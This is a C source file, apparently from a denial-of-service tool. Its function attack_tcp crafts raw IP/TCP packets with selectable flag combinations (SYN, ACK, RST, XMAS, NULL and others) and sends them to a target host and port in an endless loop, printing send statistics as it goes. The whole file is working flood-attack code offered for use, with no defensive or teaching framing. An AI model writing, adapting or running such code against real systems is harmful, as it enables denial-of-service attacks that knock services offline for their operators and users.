#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "tcp_attack.h"
#include "packet.h"
#include "utils.h"
#include "types.h"

void attack_tcp(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct tcp_hdr *tcph = (struct tcp_hdr *)(buffer + sizeof(struct ip_hdr));
	struct sockaddr_in target_addr;
	struct attack_info info;
	uint8_t flag;

	seed_rand(time(NULL));

	target_addr.sin_family = AF_INET;
	target_addr.sin_port = target->port == 0 ? 0 : htons(target->port);
	target_addr.sin_addr.s_addr = target->address;
	target->sockfd = init_socket(IPPROTO_TCP);

	if (target->attack_type == ATTACK_TCP_SYN)
		flag = TCP_SYN;
	else if (target->attack_type == ATTACK_TCP_ACK)
		flag = TCP_ACK;
	else if (target->attack_type == ATTACK_TCP_SYNACK)
		flag = TCP_SYN | TCP_ACK;
	else if (target->attack_type == ATTACK_TCP_PSHACK)
		flag = TCP_PSH | TCP_ACK;
	else if (target->attack_type == ATTACK_TCP_ACKFIN)
		flag = TCP_ACK | TCP_FIN;
	else if (target->attack_type == ATTACK_TCP_RST)
		flag = TCP_RST;
	else if (target->attack_type == ATTACK_TCP_XMAS)
		flag = TCP_FIN | TCP_SYN | TCP_RST | TCP_PSH | TCP_ACK | TCP_URG;
	else if (target->attack_type == ATTACK_TCP_NULL)
		flag = TCP_NULL;

	init_attack_info(target, &info);
	print_attack_header(&info);

	while (1) {
		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct tcp_hdr),
			IPPROTO_TCP, target->address);
		build_tcp(iph, tcph, flag, target->port);

		if (sendto(target->sockfd, buffer, iph->length, 0,
				(struct sockaddr *)&target_addr,
				sizeof(struct sockaddr_in)) == -1) {	
			info.packets_fail++;
		} else {
			info.packets_send++;
			info.total_size += iph->length;
		}
		print_attack_info(&info);
	}
}
